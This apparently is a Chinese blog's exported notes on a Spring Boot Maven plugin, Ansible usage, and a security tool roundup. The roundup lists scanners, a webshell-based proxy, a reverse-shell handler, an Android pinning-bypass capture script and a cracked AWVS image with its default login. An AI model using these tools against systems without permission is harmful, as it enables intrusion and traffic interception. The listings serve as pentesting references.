&lt;goal&gt;repackage&lt;/goal&gt;</span><br><span class="line">          &lt;/goals&gt;</span><br><span class="line">        &lt;/execution&gt;</span><br><span class="line">      &lt;/executions&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br><span class="line">&lt;/plugins&gt;</span><br></pre></td></tr></table></figure></p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210117191122.png" alt="20210117191122"></p>
<h4 id="repackage"><a href="#repackage" class="headerlink" title="repackage"></a>repackage</h4><p>绑定在package 这个phase上，可以为spring boot应用生成一个可执行的jar或war包。<br>以上面的plugin配置为例，运行mvn package会生成两个jar包，一个是原始jar包（也就是不使用这个插件时运行mvn package生成的jar包），一个是可执行的spring boot 应用的jar包。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是我的一个使用spring boot插件实例项目生成的两个war包（jar包类似）：</span><br><span class="line">webtest-1.0-SNAPSHOT.war    插件生成的war包</span><br><span class="line">webtest-1.0-SNAPSHOT.war.original     这是原始的war包</span><br></pre></td></tr></table></figure></p>
<p>原始包被重命名成以.original为后缀的包，改变后缀可使用如下配置方式：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;execution&gt;</span><br><span class="line">      &lt;goals&gt;</span><br><span class="line">        &lt;goal&gt;repackage&lt;/goal&gt;</span><br><span class="line">      &lt;/goals&gt;</span><br><span class="line">      &lt;configuration&gt;</span><br><span class="line">        &lt;!--原始包的后缀将变成.exec--&gt;</span><br><span class="line">        &lt;classifier&gt;exec&lt;/classifier&gt;   </span><br><span class="line">      &lt;/configuration&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></p>
<p>repackage生成的jar/war包会修改MANIFEST.MF文件，比如下面是我生成的war包中的MANIFEST.MF文件内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Spring-Boot-Classes: WEB-INF/classes/</span><br><span class="line">Built-By: eric</span><br><span class="line">Build-Jdk: 1.7.0_71</span><br><span class="line">Start-Class: me.test.webtest.WebMain</span><br><span class="line">Created-By: Apache Maven 3.3.9</span><br><span class="line">Spring-Boot-Lib: WEB-INF/lib/</span><br><span class="line">Spring-Boot-Version: 1.5.4.RELEASE</span><br><span class="line">Main-Class: org.springframework.boot.loader.WarLauncher</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br></pre></td></tr></table></figure></p>
<p>我的测试项目main方法在WebMain这个类里面，但是可以看到生成的manifest文件中Main-Class是WarLaucher，还多了一个叫Start-Class的属性值是才是我的main方法所在类。<br>这是跟spring boot的启动方式有关系，运行该war包先启动WarLauncher会完成一些前期准备工作，完后最终会加载WebMain运行。打成jar也是一样的道理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最终打包的的类型取决&lt;layout&gt;这个元素（第一个pom示例中有）,可选值有如下：</span><br><span class="line">WAR, 此时Main-Class如上</span><br><span class="line">JAR， 此时Main-Class 是JarLauncher</span><br><span class="line">ZIP, 包目录结构类似JAR，实时Main-Class是PropertiesLauncher</span><br><span class="line">MODULE，只将当前module打进包，且不包含任何XXXLauncher</span><br><span class="line">NONE， 和MODULE的区别是它会把当前的module的依赖也会打进包</span><br></pre></td></tr></table></figure>
<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>在命令行运行mvn spring-boot:run可以启动spring boot应用（不过一般我们调试不都是直接在ide里点吗）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以通过如下配置给启动的jvm传递参数：</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">    &lt;jvmArguments&gt;</span><br><span class="line">      -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=5005</span><br><span class="line">    &lt;/jvmArguments&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="dev-tools"><a href="#dev-tools" class="headerlink" title="dev-tools"></a>dev-tools</h4><p>spring boot 1.3之后引入了dev-tools可以让你方便开发应用，在spring boot应用启动后，它监听资源文件的改变，或者重新编译生成class，有变化之后自动刷新（repackage是不会把dev-tools打进包的，所以生产环境dev-tool是不会起作用的）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过在pom中引入：</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.5.4.RELEASE&lt;/version&gt;</span><br><span class="line">    &lt;!--指定optional为true可以避免被repackage打war时devtools也被打进war包--&gt;</span><br><span class="line">    &lt;optional&gt;true&lt;/optional&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以通过设置 <code>spring.devtools.remote.restart.enabled=false</code> 这个java系统属性，是的dev-tools只在静态资源改变是才刷新。</p>
<h4 id="start"><a href="#start" class="headerlink" title="start"></a>start</h4><h4 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h4><h2 id="解决jar包冲突问题"><a href="#解决jar包冲突问题" class="headerlink" title="解决jar包冲突问题"></a>解决jar包冲突问题</h2><p>出现的原因是:pom.xml中导入的jar包和maven自带的tomcat中的jar包发生了冲突<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--放置的都是项目所要依赖的jar包--&gt;</span><br><span class="line">&lt;!--provided的意思是编译时使用它,运行时不使用--&gt;</span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;2.5&lt;/version&gt;</span><br><span class="line">     &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;jsp-api&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;2.0&lt;/version&gt;</span><br><span class="line">     &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="DarchetypeCatalog-internal"><a href="#DarchetypeCatalog-internal" class="headerlink" title="-DarchetypeCatalog=internal"></a>-DarchetypeCatalog=internal</h2><p>这个参数的意思是:<br>如果我们使用maven为我们提供好的骨架来创建maven工程,一般是要联网的.<br>为了在不联网的情况下我们可以正常创建工程,配了这样一个参数,只要我们之前联网下载过之前相关创建工程的插件,它就会从本地仓库找到对应插件,而不会联网下载</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-悬剑知识库</title>
    <url>/2021-%E6%82%AC%E5%89%91%E7%9F%A5%E8%AF%86%E5%BA%93/</url>
    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p>简介: 一款src捡洞扫描器，支持常见目录扫描、信息泄露漏洞、 后台登录页面资产发现、跳过存在CDN的IP、一些常见未授权和弱口令检测等等</p>
<p>原理: 一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 BBScan[1] 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产捡洞和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
<p>目前 SScan[2] 的主要逻辑还是在模仿 BBScan[3]。<br><a id="more"></a><br>运行: 扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用及参数</span><br><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --help                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。/x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">```    </span><br><span class="line">GitHub项目地址：https://github.com/yhy0/SScan</span><br><span class="line"></span><br><span class="line">## pystinger</span><br><span class="line">毒刺(pystinger)通过webshell实现内网SOCK4代理,端口映射.</span><br><span class="line"></span><br><span class="line">可直接用于metasploit-framework,viper,cobalt strike上线.</span><br><span class="line"></span><br><span class="line">主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.</span><br><span class="line"></span><br><span class="line">## WAVSEP</span><br><span class="line">描述: Web应用程序漏洞扫描程序评估项目</span><br><span class="line"></span><br><span class="line">介绍: WAVSEP是一个易受攻击的Web应用程序，旨在帮助评估Web应用程序漏洞扫描程序的功能，质量和准确性。</span><br><span class="line"></span><br><span class="line">该评估平台包含一组独特的易受攻击的网页，可用于测试Web应用程序扫描程序的各种属性。</span><br></pre></td></tr></table></figure></p>
<p>下载地址: <a href="https://sourceforge.net/projects/wavsep/" target="_blank" rel="noopener">https://sourceforge.net/projects/wavsep/</a></p>
<p>GitHub项目地址：<a href="https://github.com/sectooladdict/wavsep" target="_blank" rel="noopener">https://github.com/sectooladdict/wavsep</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## AWVS</span><br><span class="line">描述: awvs是一个熟悉的web应用程序扫描框架，自动化应用程序安全测试工具，支持windows平台，主要用于扫描web应用程序上的安全问题，如SQL注入，XSS，目录遍历，命令注入等。</span><br><span class="line"></span><br><span class="line">推荐原因: 不是最新版，但是是最新的汉化破解docker版，提供给英语水平较低的工程师</span><br><span class="line"></span><br><span class="line">安装方法</span><br></pre></td></tr></table></figure></p>
<h1 id="pull-拉取下载镜像"><a href="#pull-拉取下载镜像" class="headerlink" title="pull 拉取下载镜像"></a>pull 拉取下载镜像</h1><p>docker pull secfa/docker-awvs</p>
<h1 id="将Docker的3443端口映射到物理机的-13443端口"><a href="#将Docker的3443端口映射到物理机的-13443端口" class="headerlink" title="将Docker的3443端口映射到物理机的 13443端口"></a>将Docker的3443端口映射到物理机的 13443端口</h1><p>docker run -it -d -p 13443:3443 secfa/docker-awvs</p>
<h1 id="容器的相关信息"><a href="#容器的相关信息" class="headerlink" title="容器的相关信息"></a>容器的相关信息</h1><p>awvs13 username: <a href="mailto:admin@admin.com" target="_blank" rel="noopener">admin@admin.com</a><br>awvs13 password: Admin123<br>AWVS版本：13.0.200217097<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">博客地址：https://www.sqlsec.com/2020/04/awvs.html</span><br><span class="line"></span><br><span class="line">## domain_hunter</span><br><span class="line">介绍: 一个Burp Suite扩展，尝试自动查找组织的所有子域，相似域和相关域</span><br></pre></td></tr></table></figure></p>
<p>用法<br>1.下载burp插件<br>2.将其添加到burp。如果没有错误，您将看到一个名为“ Domain Hunter”的新标签。<br>3.访问启用了burp代理的目标网站（或应用），确保burp记录了目标的http或https流量。<br>4.您可以仅切换到“domain hunter”标签，输入要搜索的域，然后单击“搜索”按钮。<br>5.或者您可以先运行“Crawl”以尝试查找更多子域和类似域。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![20210119092634](http://tuchuang.xchcloud.cn/20210119092634.png)</span><br><span class="line">![20210119092653](http://tuchuang.xchcloud.cn/20210119092653.png)</span><br><span class="line"></span><br><span class="line">## Unimap</span><br><span class="line">介绍: Unimap是一款基于Nmap实现的扫描速度提升工具，我们只需要提供一个IP地址给Unimap，即使是大量数据，Unimap也能够以非常快的速度完成网络扫描。Unimap是“Unique Nmap Scan”的缩写，该工具的当前版本支持在Linux、macOS、Windows或Android（Termux）等平台上正常运行。</span><br><span class="line"></span><br><span class="line">安装</span><br></pre></td></tr></table></figure></p>
<p>您需要在计算机中安装Rust和Nmap，然后运行：</p>
<p>cargo install unimap<br>该命令将从crates.io源安装Unimap。<br>也可以使用下列命令安装和配置Unimap</p>
<ol>
<li>git clone <a href="https://github.com/Edu4rdSHL/unimap.git" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/unimap.git</a> &amp;&amp; cd unimap<h1 id="Alternatively-you-can-download-a-release-from-https-github-com-Edu4rdSHL-unimap-releases-latest"><a href="#Alternatively-you-can-download-a-release-from-https-github-com-Edu4rdSHL-unimap-releases-latest" class="headerlink" title="Alternatively you can download a release from https://github.com/Edu4rdSHL/unimap/releases/latest"></a>Alternatively you can download a release from <a href="https://github.com/Edu4rdSHL/unimap/releases/latest" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/unimap/releases/latest</a></h1><h1 id="extract-it-and-continue-to-next-step"><a href="#extract-it-and-continue-to-next-step" class="headerlink" title="extract it and continue to next step."></a>extract it and continue to next step.</h1></li>
<li>cargo build –release<h1 id="Now-the-binary-is-in-target-release-unimap"><a href="#Now-the-binary-is-in-target-release-unimap" class="headerlink" title="Now the binary is in ./target/release/unimap"></a>Now the binary is in ./target/release/unimap</h1>构建好的代码将存储在“./target/release/unimap”路径下</li>
</ol>
<p>使用AUR软件包。（Arch Linux）</p>
<p>unimap可以使用AUR帮助程序从可用的AUR软件包中安装。例如，</p>
<p>yay -S unimap<br>如果愿意，可以克隆AUR软件包，然后使用makepkg对其进行编译。例如，</p>
<p>git clone <a href="https://aur.archlinux.org/unimap.git" target="_blank" rel="noopener">https://aur.archlinux.org/unimap.git</a> &amp;&amp; cd unimap &amp;&amp; makepkg -si<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![20210119092822](http://tuchuang.xchcloud.cn/20210119092822.png)</span><br><span class="line"></span><br><span class="line">工具使用样例</span><br></pre></td></tr></table></figure></p>
<p>下列命令可以执行完整的扫描任务，并将输出存储至log.csv中：</p>
<p>unimap -f targets.txt -u log.csv<br>下列命令将执行快速扫描，并将日志文件存储至logs/目录下：</p>
<p>unimap -f targets.txt –fast-scan -o<br>下列命令将扫描1-1000端口，并探测相应的服务和版本：</p>
<p>sudo unimap -f targets.txt –iport 1 –lport 1000 –min-rate 1000<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址: https://github.com/Edu4rdSHL/unimap</span><br><span class="line"></span><br><span class="line">## Karkinos</span><br><span class="line">介绍:Karkinos是一款轻巧的“瑞士军刀”，用于渗透测试和/或黑客攻击CTF。目前，Karkinos提供以下功能：</span><br><span class="line"></span><br><span class="line">•编码/解码字符</span><br><span class="line">•加密/解密文本或文件</span><br><span class="line">•反向外壳处理</span><br><span class="line">•破解并生成哈希</span><br><span class="line"></span><br><span class="line">依赖关系</span><br><span class="line">•任何能够托管PHP的服务器；经过Apache Server测试</span><br><span class="line">•使用PHP 7.4.9测试</span><br><span class="line">•Python3 确保它在您的路径中为：Windows：python Linux：python3 如果不在，请在以下位置更改命令：includes/pid.php</span><br><span class="line">•pip3</span><br><span class="line">•Raspberry Pi零友好</span><br><span class="line"></span><br><span class="line">安装</span><br></pre></td></tr></table></figure></p>
<p>git clone <a href="https://github.com/helich0pper/Karkinos.git" target="_blank" rel="noopener">https://github.com/helich0pper/Karkinos.git</a><br>cd Karkinos<br>pip3 install -r requirements.txt<br>cd wordlists &amp;&amp; tar -xf passlist.zip<br>如果未安装tar，也可以使用文件资源管理器手动将其解压缩。只要确保passlist.txt在wordlists目录中即可<br>添加 extension=php_sqlite3.dll到你的 php.ini 文件<br>如果找不到请参考docs[3]<br>使用您喜欢的Web服务器托管它，或: php -S 127.0.0.1:8888 在Karkinos目录中运行：<br>重要提示：使用端口5555将与反向外壳处理程序服务器冲突<br>如果坚持使用端口5555，修改 /bin/Server/app.py Line 88的PORT 值<br>重要提示”中 更改反向外壳处理程序服务器值：<br>如果坚持使用端口5556，则使用端口5556将与目录和文件清除服务器冲突，在中更改目录和文件清除服务器 /bin/Busting/app.py Line 111的PORT 值<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">项目地址: https://github.com/helich0pper/Karkinos</span><br><span class="line"></span><br><span class="line">## Process Hacker</span><br><span class="line">介绍: 一个免费，功能强大的多功能工具，可帮助您监视系统资源，调试软件和检测恶意软件。</span><br><span class="line"></span><br><span class="line">特点</span><br><span class="line">•突出显示系统活动的详细概述。</span><br><span class="line">•图形和统计信息使您可以快速跟踪资源消耗和失控过程。</span><br><span class="line">•无法编辑或删除文件？发现哪些进程正在使用该文件。</span><br><span class="line">•查看哪些程序具有活动的网络连接，并在必要时关闭它们。</span><br><span class="line">•获取有关磁盘访问的实时信息。</span><br><span class="line">•使用内核模式，WOW64和.NET支持查看详细的堆栈跟踪。</span><br><span class="line">•超越services.msc：创建，编辑和控制服务。</span><br><span class="line">•体积小，便于携带，无需安装。</span><br><span class="line">•100％免费软件（GPL v3）</span><br><span class="line"></span><br><span class="line">项目构建</span><br></pre></td></tr></table></figure></p>
<p>需要Visual Studio（2019或更高版本）。</p>
<p>如果您更喜欢使用Visual Studio构建项目，请执行目录build_release.cmd中的Executebuild来编译项目或加载ProcessHacker.sln和Plugins.sln解决方案。</p>
<p>您可以下载免费的Visual Studio Community Edition[4]来构建Process Hacker源代码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设定值:</span><br></pre></td></tr></table></figure></p>
<p>如果您正在从USB驱动器运行Process Hacker，则可能还要在其中保存Process Hacker的设置。为此，请在与ProcessHacker.exe相同的目录中创建一个名为“ ProcessHacker.exe.settings.xml”的空白文件。您可以使用Windows资源管理器执行此操作：</p>
<p>1.确保在工具&gt;文件夹选项&gt;视图中取消选中“隐藏已知文件类型的扩展名”。<br>2.右键单击该文件夹，然后选择“新建”&gt;“文本文档”。<br>3.将文件重命名为ProcessHacker.exe.settings.xml（删除“ .txt”扩展名）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KProcessHacker:</span><br></pre></td></tr></table></figure></p>
<p>Process Hacker使用内核模式驱动程序KProcessHacker来协助某些功能。这包括：</p>
<p>•捕获内核模式堆栈跟踪<br>•更有效地枚举过程句柄<br>•检索文件句柄的名称<br>•检索EtwRegistration对象的名称<br>•设置句柄属性</p>
<p>请注意，默认情况下，KProcessHacker仅允许来自具有管理特权（SeDebugPrivilege）的进程的连接。要允许Process Hacker在未以管理员身份运行时显示所有进程的详细信息，请执行以下操作：</p>
<p>1.在注册表编辑器中，导航到：HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Services \ KProcessHacker3<br>2.如果该键不存在，请在该键下创建一个名为Parameters的键。<br>3.创建一个名为SecurityLevel的DWORD值并将其设置为2。如果您没有使用正式版本，则可能需要将其设置为0。<br>4.重新启动KProcessHacker3服务（sc stop KProcessHacker3,sc start KProcessHacker3）。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址: https://github.com/processhacker/processhacker</span><br><span class="line"></span><br><span class="line">## r0capture</span><br><span class="line">安卓应用层抓包通杀脚本</span><br><span class="line"></span><br><span class="line">简介</span><br><span class="line">•仅限安卓平台，测试安卓7、8、9、10 可用 ；</span><br><span class="line">•无视所有证书校验或绑定，不用考虑任何证书的事情；</span><br><span class="line">•通杀TCP/IP四层模型中的应用层中的全部协议；</span><br><span class="line">•通杀协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf等等、以及它们的SSL版本；</span><br><span class="line">•通杀所有应用层框架，包括HttpUrlConnection、Okhttp1/3/4、Retrofit/Volley等等；</span><br><span class="line"></span><br><span class="line">用法</span><br></pre></td></tr></table></figure></p>
<p>•Spawn 模式：</p>
<p>$ python3 r0capture.py -U -f com.qiyi.video<br>•Attach 模式，抓包内容保存成pcap文件供后续分析：</p>
<p>$ python3 r0capture.py -U com.qiyi.video -p iqiyi.pcap<br>建议使用Attach模式，从感兴趣的地方开始抓包，并且保存成pcap文件，供后续使用Wireshark进行分析。<br><code>`</code><br>项目地址: <a href="https://github.com/r0ysue/r0capture" target="_blank" rel="noopener">https://github.com/r0ysue/r0capture</a></p>
<h2 id="smarGate"><a href="#smarGate" class="headerlink" title="smarGate"></a>smarGate</h2><p>官方命名为“移动网关”，通过手机客户端将位于内网的服务端网络进行按需暴露，内网穿透，c++实现，无需公网IP，小巧，易用，快速，安全，最好的多链路聚合（p2p+proxy）模式，不做之一…这才是你真正想要的内网穿透工具！</p>
<p>具备如下技术特点：</p>
<p>•安全性<br>•手机客户端作为唯一的访问入口，按需开放，及时关闭。<br>•电脑可以接入手机热点或wifi环境下通过访问手机开放的端口穿透到内网进行访问（客户端会显示手机ip）。<br>•手机网络一般为私有网段别人无法访问。<br>•用户间隔离。<br>•扩展性<br>•基于内网网段代理，可以配合众多工具实现各种网络服务能力（telnet、ssh、http服务、内网摄像头、远程桌面等）<br>•面向极客，可访问自定义的内网服务（rpc）<br>•便利性<br>•手机客户端一点配置<br>•服务能力动态增减<br>•高性能<br>•0.1.1版本开始采用自主网络引擎，性能高，千元手机客户端能支持1千以上的并发共享访问<br>•高性能设计：</p>
<p>•跨平台实现 socket 多路复用，支持：poll、epoll、kqueue、port、select、IOCP 等模型<br>•采用 lock-free 算法<br>•线程池设计<br>•socket 连接池<br>•多级任务队列</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210119093621.png" alt="20210119093621"></p>
<p>项目地址: <a href="https://github.com/lazy-luo/smarGate" target="_blank" rel="noopener">https://github.com/lazy-luo/smarGate</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Ansible复盘</title>
    <url>/Ansible%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h3 id="在线手册"><a href="#在线手册" class="headerlink" title="在线手册"></a>在线手册</h3><p><a href="https://www.cnblogs.com/f-ck-need-u/p/7576137.html" target="_blank" rel="noopener">网站架构从0起步系列文章总目录</a><br><a href="https://files-cdn.cnblogs.com/files/f-ck-need-u/Ansible_book.pdf" target="_blank" rel="noopener">Ansible手册</a><br><a href="https://www.cnblogs.com/f-ck-need-u/p/7221713.html" target="_blank" rel="noopener">man rsync翻译(rsync命令中文手册)</a></p>
<h3 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h3><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>-k 参数：不配密匙，不配账号密码，手动输入。<br><code>ansible 192.168.30.101-m ping -k</code><br>仅支持询问第一个 ip，多个 ip 不支持。<br><a id="more"></a><br>inventory 文件遵循 INI 文件风格，中括号中的字符为组名。可以将同一个主机同时归并到多个不同的组中；此外，当如若目标主机使用了非默认的SSH端口，还可以在主机名称之后使用冒号加端口号来标明。</p>
<p>如果主机名称遵循相似的命名模式，还可以使用列表的方式标识各主机示例：<br>[websrvs]<br>www[01:100].example.com<br>[dbsrvs]<br>db-[a:f]example.com<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible命令执行过程</span><br><span class="line">1.加载自己的配置文件默认/etc/ansible/ansible.cfg</span><br><span class="line">2.加载自己对应的模块文件，如command</span><br><span class="line">3.通过ansible将模块或命令生成对应的临时py文件，并将该文件传输至远程服务器的对应执行用户$HOME/.ansible/tmp/ansible-tmp-数字/xXx.PY文件</span><br><span class="line">4.给文件+x执行</span><br><span class="line">5.执行并返回结果</span><br><span class="line">6.删除临时py文件，sleep O退出</span><br><span class="line"></span><br><span class="line">执行状态：</span><br><span class="line">绿色：执行成功并且不需要做改变的操作</span><br><span class="line">黄色：执行成功并且对目标主机做变更</span><br><span class="line">红色：执行失败</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加入环境变量：</span><br><span class="line">echo &quot;export PATH=$PATH:/usr/git/bin&quot; &gt;&gt; /etc/profile</span><br><span class="line">source /etc/profile   //使修改的文件生效</span><br></pre></td></tr></table></figure>
<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ansible配置文件/etc/ansible/ansible.cfg（一般保持默认）</span><br><span class="line">[defaults]</span><br><span class="line">#inventory =/etc/ansible/hosts#主机列表配置文件#library =/usr/share/my_modules/#库文件存放目录</span><br><span class="line">#remote_tmp =$HOME/.ansible/tmp#临时py命令文件存放在远程主机目录</span><br><span class="line">#local_tmp=$HOME/.ansible/tmp#本机的临时命令执行目录</span><br><span class="line">#forks=5#默认并发数</span><br><span class="line">#sudo_user =root#默认sudo 用户</span><br><span class="line">#ask_sudo_pass=True#每次执行ansible命令是否询问ssh密码</span><br><span class="line">#ask_pass =True</span><br><span class="line">#remote_port =22</span><br><span class="line">#host_key_checking=False#检查对应服务器的host_key，建议取消注释</span><br><span class="line">#log_path=/var/log/ansible.log#日志文件</span><br></pre></td></tr></table></figure>
<h4 id="简单参数"><a href="#简单参数" class="headerlink" title="简单参数"></a>简单参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ansible通过ssh实现配置管理、应用部署、任务执行等功能，建议配置ansible端能基于密钥认证的方式联系各被管理节点</span><br><span class="line">ansible &lt;host-pattern&gt;[-m module_name][-a args]</span><br><span class="line">--version显示版本</span><br><span class="line">-m module指定模块，默认为command</span><br><span class="line">-V详细过程-Vw-vwv更详细</span><br><span class="line">--list-hosts 显示主机列表，可简写-list</span><br><span class="line">-k，--ask-pass 提示输入ssh连接密码，默认Key验证-K，--ask-become-pass 提示输入sudo时的口令</span><br><span class="line">-C，--check 检查，并不执行</span><br><span class="line">-T，--timeout=TIMEOUT执行命令的超时时间，默认10s</span><br><span class="line">-u，--user=REMOTE_USER 执行远程执行的用户</span><br><span class="line">-b，--become代替旧版的sudo切换</span><br></pre></td></tr></table></figure>
<p><code>ansible dbsrvs -u root -k-m command -a&#39;ls /root&#39;</code><br><code>ansible dbsrvs -m command -a&#39;ls /root&#39;-u wang-k -b -K</code></p>
<h4 id="host-pattern"><a href="#host-pattern" class="headerlink" title="host-pattern"></a>host-pattern</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible的Host-pattern</span><br><span class="line"></span><br><span class="line">匹配主机的列表</span><br><span class="line">All：表示所有 Inventory 中的所有主机</span><br><span class="line">ansible all -m ping</span><br><span class="line"></span><br><span class="line">*：通配符</span><br><span class="line">ansible &quot;*&quot; -m ping</span><br><span class="line">ansible 192.168.1.* -m ping</span><br><span class="line">ansible &quot;*srvs&quot; -m ping</span><br><span class="line"></span><br><span class="line">或关系</span><br><span class="line">ansible &quot;websrvs:appsrvs&quot; -m ping</span><br><span class="line">ansible &quot;192.168.1.10:192.168.1.20&quot; -m ping</span><br><span class="line"></span><br><span class="line">逻辑与</span><br><span class="line">ansible &quot;websrvs:&amp;dbsrvs&quot; -m ping 在 websrvs 组并且在 dbsrvs 组中的主机</span><br><span class="line"></span><br><span class="line">逻辑非</span><br><span class="line">ansible websrvs:ldbsrvs&apos; -m ping 在 websrvs 组，但不在 dbsrvs 组中的主机</span><br><span class="line">注意：此处为单引号</span><br><span class="line"></span><br><span class="line">综合逻辑</span><br><span class="line">ansible ‘websrvs:dbsrvs:&amp;appsrvs:lftpsrvs&apos; -m ping 正则表达式</span><br><span class="line">ansible &quot;websrvs:&amp;dbsrvs&quot; -m ping ansible&quot;~（webldb）.*\.magedu\.com&quot; -m ping</span><br></pre></td></tr></table></figure>
